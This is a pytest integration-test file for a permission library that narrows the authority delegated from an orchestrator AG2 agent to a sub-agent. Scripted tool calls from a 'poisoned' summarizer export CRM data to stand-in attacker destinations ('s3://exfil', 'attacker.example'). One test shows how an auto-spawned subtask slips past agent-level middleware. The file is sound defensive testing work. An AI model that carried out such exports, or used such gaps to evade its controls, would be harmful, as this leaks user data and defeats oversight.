"""attenu-guard × AG2 (`ag2` 1.0.x, the AutoGen fork) — integration tests.

Runs fully offline: the LLM is `ag2.testing.TestConfig`, AG2's own shipped test double,
replaying scripted `ToolCallEvent`s. No API key, no network.

The story under test is the canonical "poisoned summarizer": an orchestrator delegates
to a summarizer with `Agent.as_tool()`; the summarizer's *Python* tool list still
contains `crm_export`/`send_mail` (AG2 imposes no restriction — see
`test_ag2_itself_does_not_attenuate`), but its attenu-guard `Authority` does not cover
them, so the export is denied before the tool body runs.
"""
from __future__ import annotations

import asyncio
import json

import pytest

pytest.importorskip("ag2")

from ag2 import Agent, MemoryStream, tool  # noqa: E402
from ag2.agent import TaskConfig  # noqa: E402
from ag2.events import ToolCallEvent, ToolErrorEvent, ToolResultEvent  # noqa: E402
from ag2.testing import TestConfig  # noqa: E402
from ag2.tools.final.function_tool import _wrap_middleware  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402
from attenu_guard.adapters.ag2 import (  # noqa: E402
    Grant,
    _Gate,
    GuardRegistry,
    ToolPolicy,
    guard_middleware,
    guard_tool_hook,
    guarded_agent,
    guarded_tools,
)

# --------------------------------------------------------------------------
# scenario fixtures
# --------------------------------------------------------------------------

ORCHESTRATOR_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_GRANT = Grant(
    authority=Authority(
        scopes={"crm.read"},
        ceilings=[RowLimit(5_000), EgressRank("none")],
        ttl=900,
    ),
    task="summarize Q3 pipeline",
)


class Effects:
    """Side-effect recorder. A tool body that never runs never increments."""

    def __init__(self) -> None:
        self.crm_query = 0
        self.crm_export = 0
        self.send_mail = 0
        self.exported_to: list[str] = []


def _summarizer_tools(effects: Effects) -> list:
    @tool
    def crm_query(rows: int) -> str:
        """Query the CRM."""
        effects.crm_query += 1
        return f"queried {rows} rows"

    @tool
    def crm_export(destination: str) -> str:
        """Export CRM data to a destination."""
        effects.crm_export += 1
        effects.exported_to.append(destination)
        return f"exported to {destination}"

    @tool
    def send_mail(to: str, body: str) -> str:
        """Send an email."""
        effects.send_mail += 1
        return f"mailed {to}"

    return [crm_query, crm_export, send_mail]


POLICIES = {
    "crm_query": ToolPolicy(scope="crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy(scope="crm.export", context=lambda a: {"egress": "any"}),
    "send_mail": ToolPolicy(scope="mail.send", context=lambda a: {"egress": "any"}),
}

ORCHESTRATOR_POLICIES = {
    # `Agent.as_tool()` names the delegating tool `task_<agent-name>`
    # (`ag2/tools/subagents/subagent_tool.py:45`).
    "task_summarizer": ToolPolicy(
        scope="crm.read", delegates_to="summarizer", grant=SUMMARIZER_GRANT
    ),
}


def _call(name: str, **args) -> ToolCallEvent:
    return ToolCallEvent(name, arguments=json.dumps(args))


def _build(
    effects: Effects,
    summarizer_script,
    *,
    guarded: bool,
    audit_path=None,
    on_deny: str = "result",
    orchestrator_policies=None,
):
    """Build the orchestrator → summarizer pair, with or without attenu-guard."""
    root = Guard.issue(
        "orchestrator", ORCHESTRATOR_AUTHORITY, task="root", audit_path=audit_path
    )
    registry = GuardRegistry(root, "orchestrator")

    summ_config = TestConfig(*summarizer_script)
    orch_config = TestConfig(_call("task_summarizer", objective="summarize Q3"), "done")
    child_stream = MemoryStream()
    tools = _summarizer_tools(effects)

    if guarded:
        summarizer = guarded_agent(
            "summarizer",
            "Summarize the Q3 pipeline.",
            config=summ_config,
            tools=tools,
            policies=POLICIES,
            registry=registry,
            on_deny=on_deny,
        )
        orchestrator = guarded_agent(
            "orchestrator",
            "Produce the board pack.",
            config=orch_config,
            tools=[summarizer.as_tool(description="Summarize CRM data.", stream=child_stream)],
            policies=orchestrator_policies or ORCHESTRATOR_POLICIES,
            registry=registry,
            on_deny=on_deny,
        )
    else:
        summarizer = Agent(
            "summarizer", "Summarize the Q3 pipeline.", config=summ_config, tools=tools
        )
        orchestrator = Agent(
            "orchestrator",
            "Produce the board pack.",
            config=orch_config,
            tools=[summarizer.as_tool(description="Summarize CRM data.", stream=child_stream)],
        )
    return orchestrator, registry, child_stream


async def _result_text(*histories) -> str:
    out = []
    for history in histories:
        for event in await history.get_events():
            if type(event).__name__ not in ("ToolResultEvent", "ToolErrorEvent"):
                continue
            parts = getattr(event.result, "parts", [])
            if parts:
                out.append(str(getattr(parts[0], "content", "")))
    return "\n".join(out)


# --------------------------------------------------------------------------
# 1. baseline — AG2 alone does NOT attenuate the sub-agent
# --------------------------------------------------------------------------


def test_ag2_itself_does_not_attenuate():
    """Without attenu-guard the poisoned export EXECUTES.

    This is the control: it proves the deny in the guarded tests comes from
    attenu-guard and not from anything AG2 does on its own.
    """
    effects = Effects()
    orchestrator, _, _ = _build(
        effects,
        [
            _call("crm_query", rows=4200),
            _call("crm_export", destination="s3://exfil"),
            "summary",
        ],
        guarded=False,
    )
    asyncio.run(orchestrator.ask("summarize Q3 pipeline"))

    assert effects.crm_query == 1
    # The sub-agent keeps its full tool list; nothing relates it to the parent.
    assert effects.crm_export == 1
    assert effects.exported_to == ["s3://exfil"]


# --------------------------------------------------------------------------
# 2. the guarded run — allow, deny-before-body
# --------------------------------------------------------------------------


def test_allowed_tool_runs_and_poisoned_export_is_denied_before_body():
    effects = Effects()
    orchestrator, _, child_stream = _build(
        effects,
        [
            _call("crm_query", rows=4200),
            _call("crm_export", destination="s3://exfil"),
            "summary",
        ],
        guarded=True,
    )

    async def scenario():
        reply = await orchestrator.ask("summarize Q3 pipeline")
        return await _result_text(child_stream.history, reply.history)

    text = asyncio.run(scenario())

    # (a) in-authority call executed
    assert effects.crm_query == 1
    # (b) the poisoned step never reached the tool body
    assert effects.crm_export == 0
    assert effects.exported_to == []
    assert "scope_not_granted" in text, text


def test_ceiling_denies_oversized_query_before_body():
    """Same scope, but over the child's RowLimit(5_000) ceiling."""
    effects = Effects()
    orchestrator, _, child_stream = _build(
        effects, [_call("crm_query", rows=50_000), "summary"], guarded=True
    )

    async def scenario():
        await orchestrator.ask("summarize Q3 pipeline")
        return await _result_text(child_stream.history)

    text = asyncio.run(scenario())
    assert effects.crm_query == 0
    assert "ceiling_exceeded" in text, text


def test_send_mail_denied_even_though_parent_holds_the_scope():
    """`mail.send` is in the ORCHESTRATOR's authority but not the child's."""
    effects = Effects()
    orchestrator, _, _ = _build(
        effects, [_call("send_mail", to="x@y.z", body="hi"), "summary"], guarded=True
    )
    asyncio.run(orchestrator.ask("summarize Q3 pipeline"))
    assert effects.send_mail == 0


def test_parallel_batch_is_gated_per_call():
    """AG2 runs a turn's tool calls concurrently (`ag2/tools/executor.py:60`); each
    one is still checked independently."""
    effects = Effects()
    orchestrator, _, child_stream = _build(
        effects,
        [
            [
                _call("crm_query", rows=100),
                _call("crm_export", destination="s3://exfil"),
                _call("send_mail", to="x@y.z", body="hi"),
            ],
            "summary",
        ],
        guarded=True,
    )

    async def scenario():
        await orchestrator.ask("summarize Q3 pipeline")
        return await _result_text(child_stream.history)

    text = asyncio.run(scenario())
    assert effects.crm_query == 1
    assert effects.crm_export == 0
    assert effects.send_mail == 0
    assert text.count("attenu-guard:") == 2, text


# --------------------------------------------------------------------------
# 3. delegation is a gate, not a notification
# --------------------------------------------------------------------------


def test_delegation_mints_the_child_before_the_sub_agent_runs():
    effects = Effects()
    orchestrator, registry, _ = _build(
        effects, [_call("crm_query", rows=10), "summary"], guarded=True
    )
    assert registry.get("summarizer") is None

    asyncio.run(orchestrator.ask("summarize Q3"))

    child = registry.get("summarizer")
    assert child is not None
    assert child.is_narrower_than(registry.root)
    assert effects.crm_query == 1


def test_denied_delegation_never_starts_the_sub_agent():
    """Denying `task_summarizer` stops the whole sub-agent, and mints no child."""
    effects = Effects()
    orchestrator, registry, _ = _build(
        effects,
        [_call("crm_query", rows=10), "summary"],
        guarded=True,
        # The delegation is priced at a scope the orchestrator does not hold.
        orchestrator_policies={
            "task_summarizer": ToolPolicy(
                scope="admin.reset", delegates_to="summarizer", grant=SUMMARIZER_GRANT
            )
        },
    )

    async def scenario():
        reply = await orchestrator.ask("summarize Q3")
        return await _result_text(reply.history)

    text = asyncio.run(scenario())
    assert registry.get("summarizer") is None, "child minted despite the denial"
    assert effects.crm_query == 0, "sub-agent ran despite the denial"
    assert "scope_not_granted" in text, text


# --------------------------------------------------------------------------
# 4. revocation cascades
# --------------------------------------------------------------------------


def test_revocation_denies_subsequent_tool_calls():
    """After the orchestrator revokes the summarizer, the *same* in-authority call
    that succeeded before is denied — through the real AG2 tool path."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)

    summarizer = guarded_agent(
        "summarizer",
        "Summarize.",
        config=TestConfig(
            _call("crm_query", rows=100),
            "one",
            _call("crm_query", rows=100),
            "two",
        ),
        tools=_summarizer_tools(effects),
        policies=POLICIES,
        registry=registry,
    )

    async def scenario():
        await summarizer.ask("go")
        assert effects.crm_query == 1
        registry.revoke("summarizer")
        reply = await summarizer.ask("go again")
        return await _result_text(reply.history)

    text = asyncio.run(scenario())
    assert effects.crm_query == 1, "revoked agent still executed a tool body"
    assert "revoked" in text, text


# --------------------------------------------------------------------------
# 5. structural guarantees
# --------------------------------------------------------------------------


def test_delegation_requesting_more_than_parent_is_met_down():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")
    registry = GuardRegistry(root, "orchestrator")
    greedy = Grant(
        authority=Authority(
            scopes={"crm.*", "mail.send", "admin.*"},
            ceilings=[RowLimit(10_000_000), EgressRank("any")],
            ttl=99_999,
        ),
        task="greedy",
    )
    child = registry.delegate("orchestrator", "summarizer", greedy)

    assert child.is_narrower_than(root)
    assert not child.check("admin.reset")
    assert not child.check("crm.read", context={"rows": 1_000_000})
    assert child.authority.ceiling("max_rows").max_rows <= 100_000


# --------------------------------------------------------------------------
# 6. audit trail
# --------------------------------------------------------------------------


def test_audit_log_verifies_and_records_the_deny(tmp_path):
    effects = Effects()
    audit_path = tmp_path / "audit.jsonl"
    orchestrator, registry, _ = _build(
        effects,
        [
            _call("crm_query", rows=4200),
            _call("crm_export", destination="s3://exfil"),
            "summary",
        ],
        guarded=True,
        audit_path=audit_path,
    )
    asyncio.run(orchestrator.ask("summarize Q3 pipeline"))

    entries = registry.root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, err

    events = [e["event"] for e in entries]
    assert "spawn" in events
    assert "allow" in events
    assert "deny" in events

    denies = [e for e in entries if e["event"] == "deny"]
    assert any(
        d.get("scope") == "crm.export"
        and d.get("tool") == "crm_export"
        and d.get("reason") == "scope_not_granted"
        for d in denies
    ), denies


# --------------------------------------------------------------------------
# 7. adapter behaviours
# --------------------------------------------------------------------------


def test_unmapped_tool_is_fail_closed():
    """A tool with no ToolPolicy is denied, not silently allowed."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")

    agent = guarded_agent(
        "orchestrator",
        "go",
        config=TestConfig(_call("crm_query", rows=1), "done"),
        tools=_summarizer_tools(effects),
        policies={},  # nothing mapped
        registry=registry,
    )

    async def scenario():
        reply = await agent.ask("go")
        return await _result_text(reply.history)

    text = asyncio.run(scenario())
    assert effects.crm_query == 0
    assert "no ToolPolicy" in text, text


def test_agent_with_no_delegated_guard_is_fail_closed():
    """An agent nobody delegated to has no authority at all."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")  # never delegates

    agent = guarded_agent(
        "summarizer",
        "go",
        config=TestConfig(_call("crm_query", rows=1), "done"),
        tools=_summarizer_tools(effects),
        policies=POLICIES,
        registry=registry,
    )

    async def scenario():
        reply = await agent.ask("go")
        return await _result_text(reply.history)

    text = asyncio.run(scenario())
    assert effects.crm_query == 0
    assert "holds no delegated authority" in text, text


def test_on_deny_error_returns_a_tool_error_event():
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)

    agent = guarded_agent(
        "summarizer",
        "go",
        config=TestConfig(_call("crm_export", destination="s3://exfil"), "done"),
        tools=_summarizer_tools(effects),
        policies=POLICIES,
        registry=registry,
        on_deny="error",
    )

    async def scenario():
        reply = await agent.ask("go")
        return [type(e).__name__ for e in await reply.history.get_events()]

    # TestClient re-raises a top-level ToolErrorEvent on the next turn
    # (`ag2/testing.py:36-38`); the assertion that matters is the body never ran.
    with pytest.raises(PermissionError):
        asyncio.run(scenario())
    assert effects.crm_export == 0


def test_invalid_on_deny_is_rejected():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    with pytest.raises(ValueError):
        guard_middleware(registry, POLICIES, on_deny="explode")


def test_guarded_agent_puts_the_guard_first():
    """Middleware ordering is trust ordering; the guard must run outermost."""
    from ag2.middleware import BaseMiddleware, Middleware

    class Passthrough(BaseMiddleware):
        pass

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    other = Middleware(Passthrough)
    agent = guarded_agent(
        "orchestrator",
        "go",
        config=TestConfig("done"),
        tools=[],
        policies={},
        registry=registry,
        middleware=[other],
    )
    # `Agent.middleware` reports `DescribedMiddleware` wrappers, not the factories.
    assert agent.middleware[0].description.kind == "DelegationGuard"
    assert agent.middleware[1].middleware is other


# --------------------------------------------------------------------------
# 8. the tool-level hook — reaches children whose constructor AG2 owns
# --------------------------------------------------------------------------


def test_agent_middleware_does_not_reach_an_auto_spawned_subtask():
    """The gap `guarded_tools()` exists to close.

    `_spawn_subtask` builds the child `Agent` with the parent's tool objects but no
    `middleware=` (`ag2/agent.py:1463-1469`), and `TaskConfig` has no such field
    (`ag2/agent.py:102-119`). Agent-level middleware therefore never sees the
    subtask's calls.
    """
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")

    tools = _summarizer_tools(effects)
    agent = guarded_agent(
        "orchestrator",
        "go",
        config=TestConfig(_call("run_subtask", task="dump the CRM"), "done"),
        tools=tools,
        policies={
            "run_subtask": ToolPolicy(scope="crm.read"),
            **POLICIES,
        },
        registry=registry,
        tasks=TaskConfig(
            config=TestConfig(_call("crm_export", destination="s3://exfil"), "sub done")
        ),
    )
    asyncio.run(agent.ask("go"))

    # The parent's own middleware allowed `run_subtask`, and the subtask then ran
    # `crm_export` unguarded.
    assert effects.crm_export == 1


def test_guarded_tools_gates_an_auto_spawned_subtask():
    """Per-tool middleware travels with the deep-copied tool object into the child
    (`ag2/tools/final/function_tool.py:110-111`), so the same policy applies there."""
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")

    policies = {"run_subtask": ToolPolicy(scope="crm.read"), **POLICIES}
    tools = guarded_tools(_summarizer_tools(effects), registry, policies)

    agent = guarded_agent(
        "orchestrator",
        "go",
        config=TestConfig(_call("run_subtask", task="dump the CRM"), "done"),
        tools=tools,
        policies=policies,
        registry=registry,
        tasks=TaskConfig(
            config=TestConfig(_call("crm_export", destination="s3://exfil"), "sub done")
        ),
    )
    asyncio.run(agent.ask("go"))

    # The subtask agent holds no delegated Guard at all -> fail-closed.
    assert effects.crm_export == 0
    assert effects.exported_to == []


def test_guard_tool_hook_is_usable_as_bare_tool_middleware():
    effects = Effects()
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    registry.delegate("orchestrator", "summarizer", SUMMARIZER_GRANT)
    hook = guard_tool_hook(registry, POLICIES, agent_name="summarizer")

    tools = [t.with_middleware(hook) for t in _summarizer_tools(effects)]
    agent = Agent(
        "summarizer",
        "go",
        config=TestConfig(
            _call("crm_query", rows=10), _call("crm_export", destination="s3://x"), "done"
        ),
        tools=tools,
    )
    asyncio.run(agent.ask("go"))

    assert effects.crm_query == 1
    assert effects.crm_export == 0


def test_guarded_tools_refuses_a_toolkit():
    from ag2 import Toolkit

    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY)
    registry = GuardRegistry(root, "orchestrator")
    kit = Toolkit(*_summarizer_tools(Effects()))
    with pytest.raises(TypeError):
        guarded_tools([kit], registry, POLICIES)


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# _Gate.run awaits call_next(event, context) itself, exactly like
# adapters/langgraph.py's reference wiring, so WRAPPER_ASYNC is a genuine
# observation with no cross-hook correlation of any kind.
# ==========================================================================
def _v2_gate(authority=None, *, on_deny="result", strict_single_hook=True):
    root = Guard.issue("orchestrator", authority or ORCHESTRATOR_AUTHORITY,
                       task="root", schema_version=2)
    registry = GuardRegistry(root, "orchestrator")
    gate = _Gate(registry, POLICIES, agent_name="orchestrator", on_deny=on_deny,
                 strict_single_hook=strict_single_hook)
    return root, registry, gate


def test_v2_allowed_call_records_a_returned_outcome():
    root, registry, gate = _v2_gate()
    event = _call("crm_query", rows=10)

    async def call_next(ev, ctx):
        return ToolResultEvent.from_call(ev, result="10 rows")

    result = asyncio.run(gate.run(call_next, event, context=None))
    assert isinstance(result, ToolResultEvent)

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.ag2"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
    assert registry.get("orchestrator").complete()


def test_v2_a_tool_error_event_records_a_raised_outcome():
    """Pinned ag2 1.0.2's FunctionTool.__call__ catches every tool-body exception itself and
    returns a ToolErrorEvent carrying the original .error -- never a raised Python exception
    through call_next's own return. This adapter reads that typed signal honestly."""
    root, registry, gate = _v2_gate()
    event = _call("crm_query", rows=10)

    async def call_next(ev, ctx):
        return ToolErrorEvent.from_call(ev, error=ValueError("boom"))

    result = asyncio.run(gate.run(call_next, event, context=None))
    assert isinstance(result, ToolErrorEvent)

    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome():
    narrow = Authority(scopes={"crm.read"}, ceilings=[RowLimit(5_000), EgressRank("none")], ttl=900)
    root, registry, gate = _v2_gate(narrow)  # no crm.export
    event = _call("crm_export", destination="attacker.example")
    reached = []

    async def call_next(ev, ctx):
        reached.append(ev)
        return ToolResultEvent.from_call(ev, result="exported")

    result = asyncio.run(gate.run(call_next, event, context=None))
    assert isinstance(result, ToolResultEvent)  # the denial message, not the tool's own result
    assert reached == [], "the wrapped call must never be reached on denial"

    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] == "allow"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome():
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root")  # v1, default
    registry = GuardRegistry(root, "orchestrator")
    gate = _Gate(registry, POLICIES, agent_name="orchestrator", on_deny="result")
    event = _call("crm_query", rows=10)

    async def call_next(ev, ctx):
        return ToolResultEvent.from_call(ev, result="10 rows")

    asyncio.run(gate.run(call_next, event, context=None))

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_delegation_tool_itself_is_a_priced_call_and_gets_a_real_outcome():
    """AG2's delegation is a regular tool call with its own ToolPolicy(scope=...) here
    (`task_summarizer` costs `crm.read`), so it goes through the SAME authorize()/run() as
    any other tool and DOES get capture/outcome bound -- unlike CrewAI/LangChain, where
    delegation mints via a separate path that never calls guard.check() at all. Only the
    internal registry.delegate() mint step (which runs AFTER the scope check passes, still
    inside authorize()) adds no SEPARATE check/outcome of its own."""
    root = Guard.issue("orchestrator", ORCHESTRATOR_AUTHORITY, task="root", schema_version=2)
    registry = GuardRegistry(root, "orchestrator")
    gate = _Gate(registry, ORCHESTRATOR_POLICIES, agent_name="orchestrator", on_deny="result",
                 strict_single_hook=True)
    event = _call("task_summarizer", objective="summarize Q3")

    async def call_next(ev, ctx):
        return ToolResultEvent.from_call(ev, result="delegated")

    asyncio.run(gate.run(call_next, event, context=None))

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "task_summarizer")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED
    assert "summarizer" in registry._guards, "the child Guard must still have been minted"
    # exactly one allow/outcome pair for this call -- the mint step contributes no second one
    assert len([e for e in entries if e["event"] == "allow"]) == 1
    assert len([e for e in entries if e["event"] == "outcome"]) == 1


def test_v2_async_cancelled_call_records_abandoned_and_still_propagates():
    root, registry, gate = _v2_gate()
    event = _call("crm_query", rows=10)

    async def hangs(ev, ctx):
        await asyncio.sleep(3600)
        return ToolResultEvent.from_call(ev, result="never")

    async def scenario():
        task = asyncio.ensure_future(gate.run(hangs, event, context=None))
        await asyncio.sleep(0)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    from attenu_guard.adapters.ag2 import _snapshot_params

    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"x": AliasingList([1])}
    snapshot = _snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


# ==========================================================================
# Round 2 (Codex review, batch 2, finding 1): strict_single_hook mode split.
#
# ROUND 2 CORRECTION: the version of this file reviewed by Codex constructed _Gate
# unconditionally with genuine WRAPPER_ASYNC capture -- true only when this gate is the SOLE
# middleware at its composition point. Pinned ag2 1.0.2's FunctionTool.register() composes an
# ORDERED LIST of middleware into one chain at TWO independent points (agent-level and
# tool-level -- see adapters/ag2.py's own "EXECUTION BINDING" docstring); a sibling at either
# point can short-circuit or repeat the real body. strict_single_hook (default False) is the
# fix: genuine capture is now an explicit, scoped attestation, verified below against ag2's OWN
# _wrap_middleware composition primitive, not a hand-rolled stand-in.
# ==========================================================================
def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and no outcome is ever recorded -- not merely "no outcome happens
    to be missing", but zero outcome events at all, and the body still genuinely runs."""
    root, registry, gate = _v2_gate(strict_single_hook=False)
    event = _call("crm_query", rows=10)
    body_ran = []

    async def call_next(ev, ctx):
        body_ran.append(1)
        return ToolResultEvent.from_call(ev, result="10 rows")

    result = asyncio.run(gate.run(call_next, event, context=None))
    assert isinstance(result, ToolResultEvent)
    assert body_ran == [1]

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert "call_id" in allow
    assert [e for e in entries if e["event"] == "outcome"] == []
    assert registry.get("orchestrator").complete()


@pytest.mark.parametrize("order", ["guard_outer", "sibling_outer"])
def test_v2_strict_mode_never_fabricates_when_a_sibling_short_circuits(order):
    """Compose this gate with a sibling middleware that never calls its own call_next (e.g. a
    cache/mock hook), using AG2's OWN _wrap_middleware -- the exact primitive
    FunctionTool.register() folds every middleware through -- in both orders:

    * guard_outer: the sibling is INNER and short-circuits before the real body. This gate's
      own call_next (the sibling's wrapper) still returns genuinely, so `run()` records
      RETURNED for a body that never ran. The documented, deliberately-opted-into residual of
      a violated strict_single_hook attestation.
    * sibling_outer: the sibling is OUTER and short-circuits before ever reaching this gate at
      all. Safe by construction: nothing is authorized, nothing is recorded.
    """
    root, registry, gate = _v2_gate(strict_single_hook=True)
    event = _call("crm_query", rows=10)
    body_ran = []
    mocked_event = ToolResultEvent.from_call(event, result="mocked, never reached the real body")

    async def body(ev, ctx):
        body_ran.append(1)
        return ToolResultEvent.from_call(ev, result="10 rows")

    async def short_circuiting_sibling(call_next, ev, ctx):
        # Never calls call_next -- stands in for a cache-hit / mocking middleware.
        return mocked_event

    if order == "guard_outer":
        execution = _wrap_middleware(short_circuiting_sibling, body)   # sibling INNER
        execution = _wrap_middleware(gate.run, execution)              # guard OUTER
    else:
        execution = _wrap_middleware(gate.run, body)                   # guard INNER
        execution = _wrap_middleware(short_circuiting_sibling, execution)  # sibling OUTER

    result = asyncio.run(execution(event, None))
    entries = root.audit_log().entries
    outcomes = [e for e in entries if e["event"] == "outcome"]

    if order == "guard_outer":
        assert result is mocked_event
        assert body_ran == []
        assert outcomes and outcomes[0]["body_state"] == BodyState.RETURNED  # the residual
        assert len([e for e in entries if e["event"] == "allow"]) == 1
    else:
        assert result is mocked_event
        assert body_ran == []
        assert outcomes == []  # the gate was never reached -- nothing to record
        assert [e for e in entries if e["event"] == "allow"] == []


def test_v2_strict_mode_when_guard_is_outer_and_a_sibling_retries_the_real_body():
    """Guard OUTER, a sibling INNER retries its own call_next (= the real body) twice for what
    the model sees as one tool call -- e.g. a retry-on-empty-result middleware. Verified
    empirically against ag2's own _wrap_middleware before writing this assertion (not assumed):
    the real body runs twice, but this gate's own call_next -- the sibling's wrapper -- is
    awaited exactly once and returns once with the FINAL attempt's result. One honest record,
    not corrupted, but silently under-reporting that the real body ran more than once -- the
    documented "guard outer, sibling retries" residual distinct from the short-circuit case
    above."""
    root, registry, gate = _v2_gate(strict_single_hook=True)
    event = _call("crm_query", rows=10)
    body_calls = []

    async def body(ev, ctx):
        body_calls.append(1)
        return ToolResultEvent.from_call(ev, result=f"attempt {len(body_calls)}")

    async def retrying_sibling(call_next, ev, ctx):
        await call_next(ev, ctx)          # first attempt, discarded by the sibling
        return await call_next(ev, ctx)   # final attempt, what the model actually sees

    execution = _wrap_middleware(retrying_sibling, body)   # sibling INNER, wraps the body
    execution = _wrap_middleware(gate.run, execution)      # guard OUTER

    result = asyncio.run(execution(event, None))
    assert isinstance(result, ToolResultEvent)
    assert len(body_calls) == 2, "the real body ran twice, invisibly to this gate's own record"

    entries = root.audit_log().entries
    assert len([e for e in entries if e["event"] == "allow"]) == 1
    outcomes = [e for e in entries if e["event"] == "outcome"]
    assert len(outcomes) == 1, "exactly one honest record, not two, not a duplicate error"
    assert outcomes[0]["body_state"] == BodyState.RETURNED


def test_agent_middleware_first_listed_is_outermost_end_to_end():
    """Codex re-pass (low): the module docstring's earlier "Agent-level" ordering claim was
    tested against `FunctionTool.register()`'s own `_wrap_middleware` loop IN ISOLATION, on a
    hand-built list, never through `agent.py`'s own turn setup at all -- which REVERSES
    `Agent(middleware=[...])`'s user-facing list before it ever reaches `register()`
    (`~agent.py:1362-1366`). This test drives a REAL `Agent`, a real `TestConfig`-scripted
    tool call, and two real middleware CLASSES (the factory shape `Agent(middleware=[...])`
    actually expects -- `BaseMiddleware.__init__(self, event, context)`), rather than the
    registration primitive alone, to settle it: the FIRST-listed middleware must observe
    entry/exit OUTERMOST around the second-listed and the tool body."""
    from ag2.middleware import BaseMiddleware

    order = []

    def make_mw(label):
        class MW(BaseMiddleware):
            async def on_tool_execution(self, call_next, event, context):
                order.append(f"{label}-enter")
                result = await call_next(event, context)
                order.append(f"{label}-exit")
                return result
        return MW

    @tool
    def crm_query(rows: int) -> str:
        order.append("body")
        return f"read {rows} rows"

    config = TestConfig(_call("crm_query", rows=10), "done")
    agent = Agent("orchestrator", "test", config=config, tools=[crm_query],
                  middleware=[make_mw("A"), make_mw("B")])   # A listed FIRST, B SECOND

    asyncio.run(agent.ask("go"))

    assert order == ["A-enter", "B-enter", "body", "B-exit", "A-exit"], \
        "the FIRST-listed middleware (A) must be OUTERMOST end-to-end through a real Agent"
